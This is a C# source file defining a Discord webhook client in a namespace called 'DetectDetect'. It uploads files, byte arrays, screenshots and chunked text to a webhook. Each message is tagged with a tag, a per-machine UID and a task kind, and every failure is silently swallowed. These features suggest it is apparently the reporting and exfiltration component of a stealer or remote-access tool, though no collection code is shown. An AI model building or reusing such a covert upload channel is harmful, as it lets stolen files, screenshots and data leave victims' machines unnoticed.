using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

using System.IO;

using System.Net.Http;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading.Tasks;
namespace DetectDetect
{
    using System;
    using System.IO;
    using System.Net.Http;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Json;
    using System.Text;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using static System.Windows.Forms.AxHost;

    public class DiscordWebhook {
        private readonly string _webhookUrl;
        private readonly string _tag;
        private readonly string _id;

        public string GetID() => _id;
        public string GetTAG() => _tag;

        public DiscordWebhook(string webhookUrl, string tag, string id) {
            _webhookUrl = webhookUrl;
            _tag = tag;
            _id = id;
        }

        public string GetHeader(string kind) {
            return new StringBuilder()
                .Append("   =============[HEADER]=============\n")
                .Append("[TAG][").Append(_tag).Append("]\n")
                .Append("[UID][").Append(_id).Append("]\n")
                .Append("[TSK][").Append(kind).Append("]\n")
                .Append("   =============[DATA]=============\n\n")
                .ToString();
        }

        public async Task UploadBytesFileAsync(byte[] bys, string message, string fileName) {
            try {
                using (var client = new HttpClient()) {
                    using (var content = new MultipartFormDataContent()) {
                        content.Add(new StringContent(message), "content");
                        var fileContent = new ByteArrayContent(bys);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                        content.Add(fileContent, "file", fileName);
                        var response = await client.PostAsync(_webhookUrl, content);
                        if (!response.IsSuccessStatusCode) {
                            throw new Exception($"Failed to upload file: {response.StatusCode}");
                        }
                    }
                }
            } catch { }
        }

        public async Task UploadBytesImageAsync(byte[] bys, string message, string fileName) {
            try {
                using (var client = new HttpClient()) {
                    using (var content = new MultipartFormDataContent()) {
                        content.Add(new StringContent(message), "content");
                        var fileContent = new ByteArrayContent(bys);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                        content.Add(fileContent, "file", fileName);
                        var response = await client.PostAsync(_webhookUrl, content);
                        if (!response.IsSuccessStatusCode) {
                            throw new Exception($"Failed to upload file: {response.StatusCode}");
                        }
                    }
                }
            } catch { }
        }

        public async Task SendImageAsync(string imagePath, string message) {
            try {
                using (var client = new HttpClient()) {
                    using (var content = new MultipartFormDataContent()) {
                        content.Add(new StringContent(message), "content");
                        byte[] fileBytes = File.ReadAllBytes(imagePath);
                        var fileContent = new ByteArrayContent(fileBytes);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png"); // Change to the appropriate media type if not PNG
                        content.Add(fileContent, "file", Path.GetFileName(imagePath));
                        var response = await client.PostAsync(_webhookUrl, content);
                        if (!response.IsSuccessStatusCode) {
                            throw new Exception($"Failed to upload image: {response.StatusCode}");
                        }
                    }
                }
            } catch { }
        }

        public async Task UploadTextFileAsync(string filePath, string message) {
            try {
                using (var client = new HttpClient()) {
                    using (var content = new MultipartFormDataContent()) {
                        content.Add(new StringContent(message), "content");
                        byte[] fileBytes = File.ReadAllBytes(filePath);
                        var fileContent = new ByteArrayContent(fileBytes);
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                        content.Add(fileContent, "file", Path.GetFileName(filePath));
                        var response = await client.PostAsync(_webhookUrl, content);
                        if (!response.IsSuccessStatusCode) {
                            throw new Exception($"Failed to upload file: {response.StatusCode}");
                        }
                    }
                }
            } catch { }
        }

        public async Task SendMessageAsync(string message) {
            try {
                using (var client = new HttpClient()) {
                    var payload = new Payload { content = message };
                    var jsonPayload = SerializeToJson(payload);
                    var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                    Thread.Sleep(500);
                    var response = await client.PostAsync(_webhookUrl, httpContent);
                    if (!response.IsSuccessStatusCode) {
                        Console.WriteLine("Failed to send message: " + response.StatusCode);
                    }
                }
            } catch { }
        }

        public async Task SendMessageAsync(string message, string kind) {
            try {
                var header = GetHeader(kind);
                foreach (var msg in SplitMessage(message, header)) {
                    using (var client = new HttpClient()) {
                        var payload = new Payload { content = msg };
                        var jsonPayload = SerializeToJson(payload);
                        var httpContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                        Thread.Sleep(500);
                        var response = await client.PostAsync(_webhookUrl, httpContent);
                        if (!response.IsSuccessStatusCode) {
                            Console.WriteLine("Failed to send message: " + response.StatusCode);
                        }
                    }
                }
            } catch { }
        }

        private string SerializeToJson(Payload payload)  {
            var serializer = new DataContractJsonSerializer(typeof(Payload));
            using (var memoryStream = new MemoryStream()) {
                serializer.WriteObject(memoryStream, payload);
                return Encoding.UTF8.GetString(memoryStream.ToArray());
            }
        }

        public static IEnumerable<string> SplitMessage(string message, string header)  {
            int maxSize = 1900;
            int sizeCanTake = maxSize - header.Length;
            if (message.Length + header.Length < maxSize) {
                yield return header + message;
            }
            else
            {
                int leftToSend = message.Length;
                int taken = 0;
                while (leftToSend > 0)
                {
                    int szTake = leftToSend > sizeCanTake ? sizeCanTake : leftToSend;
                    string block = header + message.Substring(taken, szTake);
                    yield return block;
                    taken += szTake;
                    leftToSend -= szTake;
                }
            }
        }

        [DataContract]
        private class Payload
        {
            [DataMember(Name = "content")]
            public string content { get; set; }
        }
    }
}
